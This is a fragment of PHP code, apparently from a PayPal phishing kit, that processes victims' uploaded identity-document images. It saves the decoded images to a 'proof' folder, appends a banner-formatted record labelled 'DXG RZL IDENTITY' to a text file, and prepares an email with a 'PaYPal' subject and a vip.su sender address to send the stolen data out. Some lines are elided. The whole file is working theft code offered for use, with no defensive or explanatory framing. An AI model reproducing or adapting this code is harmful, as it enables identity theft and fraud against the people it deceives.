<?php 
    if(isset($_POST['doc_type'])&&isset($_POST['images'])){
        ...
        function upImg($vl){$t=microtime(true);
            ...
            file_put_contents('./../../proof/'.$name.$type,base64_decode(explode(',',$vl)[1]));return $base.$name.$type;
        }
        $_SESSION['doc_type']=$_POST['doc_type'];$msg="=========== <[ ⛔💥DXG RZL. IDENTITY💥⛔ ]> ===========\r\n";
        ...
        $msg.="TIME		: ".now()." GMT\r\n";
        $msg.="=========== <[ ⛔💥DXG RZL IDENTITY💥⛔ ]> ===========\r\n\r\n\r\n";
        $save=fopen("../../stored.txt","a+");
        fwrite($save,$msg);
        fclose($save);$subject="PaYPal ⛔💥DXG RZL💥⛔ [".$_POST['doc_type']."|".$_SESSION['ip_countryName']."]";$headers="From:DOUBLEXGG <DOUBLEXGG@vip.su>\r\n";
